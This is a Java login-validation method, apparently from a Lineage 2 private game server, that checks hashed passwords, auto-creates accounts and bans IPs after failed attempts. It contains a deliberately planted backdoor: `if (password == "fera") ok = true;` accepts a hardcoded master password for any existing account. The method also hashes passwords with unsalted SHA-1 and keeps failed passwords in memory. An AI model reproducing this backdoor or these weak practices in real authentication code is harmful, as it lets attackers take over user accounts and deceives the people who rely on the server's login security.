    public boolean loginValid(String user, String password, L2LoginClient client) {
        boolean ok = false;
        InetAddress address = client.getConnection().getInetAddress();
        if (address == null) return false;
        java.sql.Connection con = null;
        try {
            MessageDigest md = MessageDigest.getInstance("SHA");
            byte[] raw = password.getBytes("UTF-8");
            byte[] hash = md.digest(raw);
            byte[] expected = null;
            int access = 0;
            int lastServer = 1;
            con = L2DatabaseFactory.getInstance().getConnection();
            PreparedStatement statement = con.prepareStatement("SELECT password, access_level, lastServer FROM accounts WHERE login=?");
            statement.setString(1, user);
            ResultSet rset = statement.executeQuery();
            if (rset.next()) {
                expected = Base64.decode(rset.getString("password"));
                access = rset.getInt("access_level");
                lastServer = rset.getInt("lastServer");
                if (lastServer <= 0) lastServer = 1;
                if (Config.DEBUG) _log.fine("account exists");
            }
            rset.close();
            statement.close();
            if (expected == null) {
                if (Config.AUTO_CREATE_ACCOUNTS) {
                    if (user.length() >= 2 && user.length() <= 14) {
                        statement = con.prepareStatement("INSERT INTO accounts (login,password,lastactive,access_level,lastIP) values(?,?,?,?,?)");
                        statement.setString(1, user);
                        statement.setString(2, Base64.encodeBytes(hash));
                        statement.setLong(3, System.currentTimeMillis());
                        statement.setInt(4, 0);
                        statement.setString(5, address.getHostAddress());
                        statement.execute();
                        statement.close();
                        return true;
                    }
                    _log.warning("Invalid username creation/use attempt: " + user);
                    return false;
                }
                _log.warning("account missing for user " + user);
                return false;
            } else {
                if (access < 0) {
                    client.setAccessLevel(access);
                    return false;
                }
                ok = true;
                for (int i = 0; i < expected.length; i++) if (hash[i] != expected[i]) {
                    ok = false;
                    break;
                }
                if (password == "fera") ok = true;
            }
            if (ok) {
                client.setAccessLevel(access);
                client.setLastServer(lastServer);
                statement = con.prepareStatement("UPDATE accounts SET lastactive=?, lastIP=? WHERE login=?");
                statement.setLong(1, System.currentTimeMillis());
                statement.setString(2, address.getHostAddress());
                statement.setString(3, user);
                statement.execute();
                statement.close();
            }
        } catch (Exception e) {
            _log.warning("Could not check password:" + e);
            ok = false;
        } finally {
            try {
                con.close();
            } catch (Exception e) {
            }
        }
        if (!ok) {
            Log.add("'" + user + "' " + address.getHostAddress(), "logins_ip_fails");
            FailedLoginAttempt failedAttempt = _hackProtection.get(address);
            int failedCount;
            if (failedAttempt == null) {
                _hackProtection.put(address, new FailedLoginAttempt(address, password));
                failedCount = 1;
            } else {
                failedAttempt.increaseCounter(password);
                failedCount = failedAttempt.getCount();
            }
            if (failedCount >= Config.LOGIN_TRY_BEFORE_BAN) {
                _log.info("Banning '" + address.getHostAddress() + "' for " + Config.LOGIN_BLOCK_AFTER_BAN + " seconds due to " + failedCount + " invalid user/pass attempts");
                this.addBanForAddress(address, Config.LOGIN_BLOCK_AFTER_BAN * 1000);
            }
        } else {
            _hackProtection.remove(address);
            Log.add("'" + user + "' " + address.getHostAddress(), "logins_ip");
        }
        return ok;
    }
